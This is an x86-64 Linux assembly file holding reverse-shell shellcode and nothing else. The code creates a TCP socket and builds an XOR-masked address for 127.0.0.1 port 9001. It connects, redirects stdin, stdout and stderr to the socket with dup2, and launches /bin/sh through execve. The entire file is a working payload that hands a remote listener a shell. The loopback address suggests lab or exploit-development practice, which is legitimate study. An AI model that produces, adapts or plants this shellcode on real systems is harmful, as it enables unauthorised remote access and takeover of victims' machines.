global _start

section .text
_start:
    ;open new socket
    ; call socket('AF_INET', SOCK_STREAM (1), 0)
    mov    rax, 0x29
    mov    rdi, 0x02
    mov    rsi, 0x01
    cdq
    syscall
    mov    r10, rax ;socket fd
    
    ;Create address structure on stack
    ;addr: 127.0.0.1; port: 9001
    ;push b'\x02\x00#)\x7f\x00\x00\x01'
    mov    rax, 0x102010101010101
    push   rax
    mov    rax, 0x102010101010101 ^ 0x0100007f29230002
    xor    [rsp], rax
    
    ;Connect the socket
    ;call connect('rbp', 'rsp', 0x10)
    mov    rax, 0x2a
    mov    rdi, r10
    mov    rsi, rsp
    mov    rdx, 0x10
    syscall
    
    ;set stdin to the socked fd
    ;dup2(sockfd, 0);
    mov    rax, r10
    mov    rsi, 0x0
    mov    rdi, rax
    mov    rax, 0x21

    ;set stdout to the socked fd
    ;dup2(sockfd, 0);
    syscall
    mov    rax, r10
    mov    rsi, 0x1
    mov    rdi, rax
    mov    rax, 0x21

    ;set stderr to the socked fd
    ;dup2(sockfd, 0);
    syscall
    mov    rax, r10
    mov    rsi, 0x2
    mov    rdi, rax
    mov    rax, 0x21
    syscall
    
    ;start shell
    ;execue execve("/bin/sh", NULL, NULL);
    mov    r8, 0x0068732f6e69622f
    push   r8
    mov    rax, 0x3b
    lea    rdi, [rsp]
    mov    rsi, 0x00
    mov    rdx, 0x00
    syscall
